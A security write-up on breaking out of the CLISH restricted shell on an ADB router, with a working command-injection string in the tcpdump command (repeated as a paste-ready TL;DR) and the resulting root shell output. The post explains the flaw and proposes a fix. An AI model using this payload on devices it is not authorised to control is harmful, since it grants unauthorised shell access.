# Escaping from CLISH

For impatient readers: There is a TL;DR at the end.

## Short intro in CLISH

```
********************************************
*            ADB BROADBAND                 *
*                                          *
*      WARNING: Authorised Access Only     *
********************************************

Welcome  
ADB#
```

[CLISH][1] is a restricted shell which supports only a set of predefined
commands. Is seems to be developed by a single person, Graeme McKerrell,
 and was last updated 2013-04-26.

### Views
These are used to  define "views" which contain a set of commands. If you type
in `config terminal` for example the shell can open another view with
configuration command and with `exit` you can go back to the view.

### Commands
A command has basically a name, zero or more parameter and an action.
The name is constant and there is no such thing like subcommands. So it's very
simple and a name may be for example `ping` or `config terminal`.
The interesting parts are the parameters and the action. The action are
some shell commands(!) in which the parameters can be used as environment
variables. To disallow [command injection][2] you can restrict the parameter
by using a type.

### Types
A type can be defined with a *regex*,  as *selection* of values or as a
*integer*. By executing a command and while typing each parameter is matched
against its type.

As an additional countermeasure against code injection the characters
\`|$<>&()# are escaped by *adding a backslash in front* of them.

## Problem

So what exactly is the problem? Everything seems fine?
All parameter defined with types using integers and selections seem perfectly
fine if you don't screw up completely.

But what about regular expressions? In the official documentation
"as a reference" there is this type definition:

```xml
<PTYPE name="STRING"
    pattern="[^\-]+"
      help="String"/>
```

This looks pretty OK. We can't use backslashes or use the parameter
as a flag argument because "-" is forbidden. Lets look at the firmware.
Did they implement STRING is differently? YES:

```xml
<PTYPE name="STRING"  
    pattern="[^`]*"
        help="String"/>
```
So.. uhm.. They don't want the backquote (\`) in the string. This
is fine but what about the backslash and minus? Lets try it. Used here
with ping. Other implementations may have ping restricted to
IP-addresses. The ping definition looks something like this:  

### Screwing with Ping

```xml
<COMMAND name="ping"  
         help="send ICMP ECHO_REQUEST to network hosts">

  <PARAM name="destination"
     help="Destination host or IP address"
     ptype="STRING"/>

  <ACTION>exec ping "${destination}"</ACTION>
</COMMAND>
```

```sh
ADB# ping `/bin/sh`  
          ^
destination  String
```

Yes thats what probably what they expected.

```sh
ADB# ping \  
sh: syntax error: unterminated quoted string  
```

Uh oh.. This was translated to `ping "\"`.

```sh
ADB# ping \$SHELL  
ping: bad address '\/bin/clish'
```

The "$" was escaped but an additional backslash escaped the backslash: ```ping "\\$USER"```
While this is funny we can't actually execute something with it. So we have to dig a bit deeper and I found this command:

### Accessing the Shell

```xml
<COMMAND name="tcpdump enable file filter" help="tcpdump enable output file filter">  
    <PARAM name="ifname" help="interface name" ptype="IFNAMES"/>
    <PARAM name="filename" help="log file name" ptype="STRING"/>
    <PARAM name="filter" help="pcap filter" ptype="PCAPFILTER"/>
        <ACTION>
            . /etc/clish/tcpdump.sh "file" "filter" "${ifname}" "${filename}" "${filter}"
        </ACTION>
</COMMAND>  
```

```
ADB# tcpdump enable file filter br0 \ "; sh -c sh \"

ERROR:   Output File has to be stored in a connected mounted USB memory device (ex. /mnt/sda1/ )

HELP:    ...


BusyBox v1.17.3 (2015-09-23 17:35:23 CEST) built-in shell (ash)  
Enter 'help' for a list of built-in commands.

/root $ echo $USER
admin
```

**Hello shell!**

### Some extra candy

While writing this post I took a second look into the type definitions. There was a very interesting one.

```xml
<PTYPE name="WIFI_PASSPHRASE"
       pattern=".........*"
       help="More than 8 char string"/>
```
If you try to write code injection with this one make sure your code has at least 8 characters! ;)

## Mitigation

**RTFM!**
Sanitizing insecure strings by using the type definition from the reference should be enough.

## TL;DR
Paste the following code in the restricted shell to access the real shell:
`tcpdump enable file filter br0 \ "; /bin/sh -c /bin/sh \"`

[1]: http://clish.sourceforge.net/
[2]: https://www.owasp.org/index.php/Command_Injection
